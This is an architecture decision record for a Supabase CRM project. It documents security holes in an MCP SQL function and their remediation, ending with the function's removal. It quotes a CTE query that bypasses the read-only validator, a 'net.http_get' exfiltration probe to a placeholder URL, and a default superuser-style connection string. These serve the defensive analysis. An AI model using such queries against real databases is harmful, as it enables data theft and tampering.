# ADR 0011 — The MCP function is not part of the production trust boundary

**Status:** **Accepted** · **Date:** 2026-09-11
**Decided by:** owner, Phase 0.5 brief (Q12)

## Context

`supabase/functions/mcp/index.ts` exposes two tools — `query` (arbitrary SELECT) and `mutate` (arbitrary INSERT/UPDATE/DELETE) — to any holder of a signature-valid Supabase JWT. Verified properties of the current implementation:

- The pool connects with `SUPABASE_DB_URL`, defaulting to `postgresql://postgres:postgres@db:5432/postgres` — ~~**superuser**~~ `postgres` *(corrected 2026-09-13: on Supabase `postgres` is `rolsuper=false`, `rolbypassrls=true`, so it bypasses RLS all the same)* (`index.ts:22-25`).
- `query`/`mutate` downgrade to `authenticated` per transaction via `set_config('role', …, true)`, so RLS *is* enforced on those two paths. `get_schema` does **not** downgrade, and returns the full public schema map on the raw connection.
- `jwtVerify` is called with `{ issuer }` and no audience check, so any token this project issued is accepted.
- The read-only gate was bypassable: a CTE attached to DML (`WITH x AS (SELECT 1) DELETE FROM contacts`) collected `{with, select}` and passed. **Reproduced 2026-09-11**; fixed in the same change as this ADR.
- A plain `SELECT extensions.http_get(…)` is a legal read-only statement, giving outbound HTTP from inside the database — an SSRF/exfiltration path that no amount of RLS constrains.

The consequence that forces this decision: [ADR 0002](0002-tenancy-model.md) claimed the engine would be "unreachable from any browser by construction" because `ops` is off the PostgREST allowlist. A raw libpq ~~superuser~~ `postgres` (`BYPASSRLS`) connection makes that claim false. One component therefore invalidates the isolation story of the whole platform.

## Decision

**The MCP function as it exists is development/admin tooling. It is explicitly NOT part of the production trust boundary, and no production browser, end user, or AI agent may reach arbitrary SQL through it.**

Concretely, for Phase 0.5:

1. **Defence in depth on the read path, immediately.** `query` now runs its transaction under `SET TRANSACTION READ ONLY`, so Postgres itself rejects every write regardless of what the validator allowed. The AST validator is a second layer, not the only barrier — a validator bug must not be a write primitive. *(Implemented.)*
2. **The AST validator walks both halves of a `WITH`** — the CTE bindings and the statement the `WITH` is attached to — and fails closed on any node shape it does not recognise. *(Implemented, with adversarial tests.)*
3. **No AI agent receives arbitrary SQL execution.** This is a standing rule, not a configuration: agents get typed, explicit tools. Arbitrary SQL is the largest blast radius in the system and is structurally incompatible with a replaceable CRM adapter.
4. **`ops` must not exist while this function can reach it unrestricted.** Before the engine schema lands, the function is removed, restricted to a non-superuser role that has no rights on `ops`, or gated to non-production environments.

## Alternatives

- **Keep it and rely on the validator.** Rejected. It makes an application-level parser the only thing between a caller and the data, which violates the project's own principle that a boundary enforced in one layer of application code is not a boundary.
- **Delete it now.** Not chosen for Phase 0.5 only because it is genuinely useful development tooling and removing it is not required to close the holes found. The decision above constrains it; a later phase may still delete it.
- **Build the full Tool Gateway now.** Out of scope: it is Phase-1 engine work, and the remediation above does not need it.

## Consequences

- ADR 0002's isolation claim is narrowed to "unreachable through PostgREST" and its test obligation doubles: both channels must be exercised.
- The long-term direction is a **Tool Gateway** — explicit operations, least privilege, tenant scope, permission checks, risk classification, approval policy, audit log, structured inputs, and no arbitrary SQL. This ADR does not build it; it records that arbitrary SQL is not the interface agents get.
- `SET TRANSACTION READ ONLY` does **not** constrain side effects that are not database writes. A network-capable function called from a SELECT is stopped in the privilege layer, not here — see "Outbound network capability" below.
- Outstanding and not fixed by this ADR: the missing audience check on `jwtVerify`, `get_schema` running without a role downgrade, `x-forwarded-host` trusted when building OAuth metadata, and full SQL statements (with personal data) logged verbatim.

---

## Addendum 2026-09-11 — Outbound network capability (Phase 0.5C)

The Context above lists `SELECT extensions.http_get(…)` as an exfiltration path "that no amount of RLS constrains". Phase 0.5C resolved it. The two network extensions needed **opposite** answers, and the reason is ownership, not risk appetite.

### Measured

| schema | owner | `anon` USAGE | `authenticated` USAGE |
| --- | --- | --- | --- |
| `extensions` (the `http` extension) | `postgres` | closed by revoke | closed by revoke |
| `net` (the `pg_net` extension) | `supabase_admin` | **was open** | **was open** |

PostgreSQL lets only the **grantor** revoke a grant. `net.http_post`'s ACL is `anon=X/supabase_admin`; migrations run as `postgres`, which is not a member of `supabase_admin` and cannot `SET ROLE` to it. A `REVOKE` therefore succeeds syntactically and **does nothing**. Verified as `authenticated` before removal:

```sql
select net.http_get('http://127.0.0.1:1/exfil');  -- -> request_id 1, request queued
```

That is a working exfiltration primitive: syntactically read-only, satisfies RLS, posts rows off-box, and unaffected by `SET TRANSACTION READ ONLY` because it is not a write.

### Decision

**`http` is retained and contained. `pg_net` is removed.**

- **`http`** — `public.get_avatar_for_email` uses `extensions.http_get` and its trigger is live; `service_role` (edge functions, server-side) legitimately needs egress. Containment works here *because postgres owns `extensions`*, so `revoke usage on schema extensions` is real. Measured cost: none — citext equality, ILIKE and INSERT all still work, because operators resolve by OID, not by a schema-name lookup.
- **`pg_net`** — containment is **impossible** for this project: the grant is not ours to revoke. It was also unused. The repository's only reference is the dormant `public.cleanup_note_attachments`, whose four triggers the clinical profile does not install; probed on a clean database, inserting a `contact_note` left `net.http_request_queue` at zero rows, and `drop extension pg_net` succeeded without `CASCADE`. So the capability was deleted rather than fenced — `20260911235500_drop_pg_net.sql`, which refuses to run if any live trigger still calls it.

This is deliberately **not** a privilege hack against the platform owner model. An `ALTER DEFAULT PRIVILEGES`/`REVOKE` dance against `supabase_admin` would have looked applied and changed nothing, which is the failure mode this repository has already hit twice.

### Why this does not soften rule 3

Decision item 3 above — *no AI agent receives arbitrary SQL execution* — is unchanged and is still the actual boundary. Removing `pg_net` narrows the blast radius of a hypothetical arbitrary-SQL path; it does not license one. Any future component that hands a model raw SQL reopens the question for every capability in the database, not just networking.

### Standing consequence

Reinstalling `pg_net` silently re-grants `anon` and `authenticated`, and no privilege change this project can make will close it again. It is therefore guarded by an executable assertion rather than by documentation: `supabase/tests/rls_tenant_isolation.sql` fails if the extension or the `net` schema reappears (`npm run test:db`). Restoring note attachments means re-answering this question, not re-adding the extension quietly.

---

## Addendum 2026-09-13 — the function is removed (owner decision, pre-1D closure)

**Owner decision:** the generic MCP SQL function must not be a production Company OS channel. The future interface is an explicit Tool Gateway with allowlisted operations; it is not built yet.

**Dependency analysis.** Nothing in the Company OS used the function: `engine/`, `scripts/`, `e2e/`, `.github/` and the harness configuration held no reference to it. Its only consumers were a settings-screen section that displayed its URL, the matching en/fr messages, and one user documentation page. `[auth.oauth_server]` is disabled, so a remote AI client had no supported way to obtain a token for it in this fork.

**What was done.**
1. `supabase/functions/mcp/` is deleted: `index.ts`, `taskListUi.ts`, `validateSql.ts` and its test. So are its `[functions.mcp]` configuration, the settings section and its messages, the documentation page and its navigation entry, and the `CRM_BASE_URL` variable only it read. Decision item 4 is discharged by removal, the first of its three options.
2. `scripts/production-scope.mjs`, with `scripts/production-scope-commands.mjs`, refuses the committed ways back that it can read:
   - a function directory outside the reviewed allowlist of five, or a second functions tree;
   - function configuration for an unlisted function, or away from its canonical paths, and any module map or package manifest but a reviewed function's own `deno.json`;
   - an import that leaves `supabase/functions/`, a computed module name, or an external module not reviewed for the file that loads it, which is how an MCP server library or a SQL parser would arrive;
   - function source that names a known MCP server or SQL parser, hands a raw SQL call anything but a literal, a reviewed interpolation or a query Kysely compiled, or reaches the shared Postgres pool from anywhere but `merge_contacts`;
   - a function deploy outside `deploy.yml` and the makefile, one that names no function or an unlisted one, one no blocking scope check precedes, a remote CLI command against another workdir, or a committed Management API deploy call;
   - code that calls `/functions/v1/mcp` or invokes `mcp`.

   It reads JavaScript and TypeScript with the TypeScript parser. `deploy.yml` and the makefile run it before deploying and name their functions explicitly. `scripts/test/production-scope.test.mjs` and `scripts/test/production-scope-functions.test.mjs` attack it by reintroducing each path, including into the real `deploy.yml`, makefile and `config.toml`, and replay every bypass that three adversarial reviews found in earlier versions.
3. SI-03 now points at that guard. SI-07, whose only subject was the function's read path, is retired.

**What does not change.** Decision item 3 stands: no AI agent receives arbitrary SQL execution. The Context and the outstanding items above describe a function that no longer exists; they stay as the record of why it was removed.

**Not covered.** The guard reads committed files. It cannot see a person running the CLI by hand, a command or module name assembled where no literal shows it, SQL reaching the database through a method other than the raw ones it names, or code outside `supabase/functions` that is not a deploy path; a function that executes caller-supplied SQL must still fail review under item 3. A hosted project that had already received the function would keep it until it is deleted there. No hosted project exists.
